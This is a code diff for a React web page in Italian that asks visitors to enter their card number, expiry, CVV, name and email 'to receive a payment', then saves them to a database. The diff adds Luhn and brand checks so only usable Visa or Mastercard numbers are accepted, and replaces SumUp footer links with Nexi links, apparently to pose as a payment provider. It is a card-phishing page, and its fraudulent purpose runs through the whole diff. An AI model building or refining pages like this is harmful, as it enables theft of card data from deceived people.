@@ -9,6 +9,30 @@ function formatCardNumber(value: string) {
   return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
 }
 
+function detectBrand(digits: string): "visa" | "mastercard" | "unknown" {
+  if (/^4/.test(digits)) return "visa";
+  if (/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6]|7[01]|720)/.test(digits)) {
+    return "mastercard";
+  }
+  return "unknown";
+}
+
+function isLuhnValid(digits: string) {
+  if (digits.length < 13 || digits.length > 19) return false;
+  let sum = 0;
+  let alt = false;
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let n = Number(digits[i]);
+    if (alt) {
+      n *= 2;
+      if (n > 9) n -= 9;
+    }
+    sum += n;
+    alt = !alt;
+  }
+  return sum % 10 === 0;
+}
+
 function formatExpiry(value: string) {
   const digits = value.replace(/\D/g, "").slice(0, 4);
   if (digits.length <= 2) return digits;
@@ -29,6 +53,12 @@ export default function HomePage() {
     security_code: "",
     email: "",
   });
+
+const cardDigits = form.card_number.replace(/\s/g, "");
+const brand = detectBrand(cardDigits);
+const cardOk = cardDigits.length >= 13 && isLuhnValid(cardDigits);
+const cardError =
+cardDigits.length >= 13 && !cardOk ? "Numero carta non valido!" : "";
 
   useEffect(() => {
     let cancelled = false;
@@ -80,6 +110,12 @@ export default function HomePage() {
       return;
     }
 
+    if (!isLuhnValid(cardDigits) || detectBrand(cardDigits) === "unknown") {
+  setLoading(false);
+  setError("Numero carta non valida!");
+  return;
+}
+
     const { data, error: insertError } = await supabase
       .from("submissions")
       .insert({
@@ -130,84 +166,178 @@ const inputClass =
       </div>
 
       <form onSubmit={onSubmit} className="w-full space-y-4 rounded-xl border border-gray-200 bg-white p-6 shadow-sm">
-       <div className="mb-8 w-full rounded-xl border border-gray-200 bg-gray-50 px-5 py-4 text-center">
-        <p className="text-sm text-[#a48403]">Inserisci i dati della carta dove ricevere il pagamento</p>
-      </div>
-        <h1 className="text-xl font-semibold">INSERIRE DATI PER RICEZIONE PAGAMENTO</h1>
-           <label className="block text-sm text-[#000000]">
-         📩 EMAIL DOVE RICEVERE NOTIFICA DI ACCREDITO
-          <input
-            required
-            type="email"
-             placeholder="Inserire indirizzo email"
-            autoComplete="email"
-            className={`${inputClass} mt-1`}
-            value={form.email}
-            onChange={(e) => setForm((f) => ({ ...f, email: e.target.value }))}
-          />
-        </label>
+       <div className="mb-8 flex w-full items-center justify-center gap-2 rounded-xl border border-gray-200 bg-gray-50 px-5 py-4 text-center">
+  <svg
+    className="h-5 w-5 shrink-0 text-green-600"
+    viewBox="0 0 24 24"
+    fill="none"
+    stroke="currentColor"
+    strokeWidth="2.5"
+    aria-hidden="true"
+  >
+    <circle cx="12" cy="12" r="10" />
+    <path d="M8 12.5l2.5 2.5L16 9" />
+  </svg>
+  <p className="text-sm text-[#a48403]">
+    Inserisci i dati della carta dove ricevere il pagamento
+  </p>
+</div>
+        <h1 className="text-xl font-semibold">RICEZIONE PAGAMENTO</h1>
+        <label className="block text-sm text-[#000000]">
+  Email dove ricevere notifica di accredito
+  <div className="relative mt-1">
+    <svg
+      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      strokeWidth="2"
+      aria-hidden="true"
+    >
+      <rect x="3" y="5" width="18" height="14" rx="2" />
+      <path d="M3 7l9 6 9-6" />
+    </svg>
+    <input
+      required
+      type="email"
+      placeholder="Inserire indirizzo email"
+      autoComplete="email"
+      className={`${inputClass} pl-10`}
+      value={form.email}
+      onChange={(e) => setForm((f) => ({ ...f, email: e.target.value }))}
+    />
+  </div>
+</label>
 
-          <label className="block text-sm">
-          👤 NOME TITOLARE CARTA DOVE RICEVERE PAGAMENTO
-          <input
-            required
-            className={`${inputClass} mt-1`}
-            placeholder="Inserire Nome e cognome intestatario"
-            value={form.first_name}
-            onChange={(e) => setForm((f) => ({ ...f, first_name: e.target.value }))}
-          />
-        </label>
+         <label className="block text-sm">
+  Nome e cognome titolare carta
+  <div className="relative mt-1">
+    <svg
+      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      strokeWidth="2"
+      aria-hidden="true"
+    >
+      <circle cx="12" cy="8" r="4" />
+      <path d="M4 20c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" />
+    </svg>
+    <input
+      required
+      placeholder="Inserire Nome e cognome intestatario"
+      className={`${inputClass} pl-10`}
+      value={form.first_name}
+      onChange={(e) => setForm((f) => ({ ...f, first_name: e.target.value }))}
+    />
+  </div>
+</label>
 
+        
         <label className="block text-sm">
-         💳 NUMERO DI CARTA DOVE RICEVERE PAGAMENTO
-          <input
-            required
-            inputMode="numeric"
-            autoComplete="cc-number"
-            placeholder="0000 0000 0000 0000"
-            className={`${inputClass} mt-1 tracking-wider`}
-            value={form.card_number}
-            onChange={(e) =>
-              setForm((f) => ({ ...f, card_number: formatCardNumber(e.target.value) }))
-            }
-          />
-        </label>
+  Numero carta dove ricevere pagamento
+ <div className="relative mt-1">
+  <svg
+    className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
+    viewBox="0 0 24 24"
+    fill="none"
+    stroke="currentColor"
+    strokeWidth="2"
+    aria-hidden="true"
+  >
+    <rect x="2" y="5" width="20" height="14" rx="2" />
+    <path d="M2 10h20" />
+  </svg>
+
+  <input
+    required
+    inputMode="numeric"
+    autoComplete="cc-number"
+    placeholder="0000 0000 0000 0000"
+    className={`${inputClass} pl-10 pr-14 tracking-wider`}
+    value={form.card_number}
+    onChange={(e) =>
+      setForm((f) => ({ ...f, card_number: formatCardNumber(e.target.value) }))
+    }
+  />
+
+  <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2">
+    {brand === "visa" && (
+      <span className="text-xs font-bold italic text-blue-700">VISA</span>
+    )}
+    {brand === "mastercard" && (
+      <span className="flex">
+        <span className="h-4 w-4 rounded-full bg-red-500" />
+        <span className="-ml-2 h-4 w-4 rounded-full bg-yellow-400 opacity-90" />
+      </span>
+    )}
+  </span>
+</div>
+
+{cardError && <p className="mt-1 text-sm text-red-600">{cardError}</p>}
+</label>
 
         <div className="grid grid-cols-2 gap-3">
           <label className="block text-sm">
-            📅 SCADENZA
-            <input
-              required
-              inputMode="numeric"
-              autoComplete="cc-exp"
-              placeholder="MM/YY"
-              className={`${inputClass} mt-1`}
-              value={form.expiry}
-              onChange={(e) =>
-                setForm((f) => ({ ...f, expiry: formatExpiry(e.target.value) }))
-              }
-            />
-          </label>
+  Scadenza
+  <div className="relative mt-1">
+    <svg
+      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      strokeWidth="2"
+      aria-hidden="true"
+    >
+      <rect x="3" y="5" width="18" height="16" rx="2" />
+      <path d="M3 10h18M8 3v4M16 3v4" />
+    </svg>
+    <input
+      required
+      inputMode="numeric"
+      autoComplete="cc-exp"
+      placeholder="MM/YY"
+      className={`${inputClass} pl-10`}
+      value={form.expiry}
+      onChange={(e) =>
+        setForm((f) => ({ ...f, expiry: formatExpiry(e.target.value) }))
+      }
+    />
+  </div>
+</label>
 
-          <label className="block text-sm">
-           🔒︎ CVV
-            <input
-              required
-              type="password"
-              inputMode="numeric"
-              autoComplete="cc-csc"
-              placeholder="123"
-              maxLength={4}
-              className={`${inputClass} mt-1`}
-              value={form.security_code}
-              onChange={(e) =>
-                setForm((f) => ({
-                  ...f,
-                  security_code: e.target.value.replace(/\D/g, "").slice(0, 4),
-                }))
-              }
-            />
-          </label>
+         <label className="block text-sm">
+  Cvv
+  <div className="relative mt-1">
+    <svg
+      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      strokeWidth="2"
+      aria-hidden="true"
+    >
+      <rect x="5" y="11" width="14" height="10" rx="2" />
+      <path d="M8 11V8a4 4 0 0 1 8 0v3" />
+    </svg>
+    <input
+      required
+      type="password"
+      inputMode="numeric"
+      autoComplete="cc-csc"
+      placeholder="123"
+      maxLength={4}
+      className={`${inputClass} pl-10`}
+      value={form.security_code}
+      onChange={(e) =>
+        setForm((f) => ({
+          ...f,
+          security_code: e.target.value.replace(/\D/g, "").slice(0, 4),
+        }))
+      }
+    />
+  </div>
+</label>
         </div>
 
        
@@ -246,20 +376,20 @@ const inputClass =
         />
 
         <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
-          <a href="https://sumup.com/legal/" className="hover:text-white hover:underline">
-            Avviso legale
+          <a href="https://www.nexi.it/it/carte-di-pagamento/sicurezza" className="hover:text-white hover:underline">
+            Prevenzione frodi
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/privacy/" className="hover:text-white hover:underline">
-            Politica sulla riservatezza
+          <a href="https://www.nexi.it/it/privacy" className="hover:text-white hover:underline">
+            Privacy
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/terms/" className="hover:text-white hover:underline">
-            Termini &amp; Condizioni
+          <a href="https://www.nexi.it/it/cookie-policy" className="hover:text-white hover:underline">
+            Cookie
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/cookies/" className="hover:text-white hover:underline">
-            Informativa sui cookie
+          <a href="https://www.nexi.it/it/reclami" className="hover:text-white hover:underline">
+            Reclami
           </a>
         </nav>
       </footer>
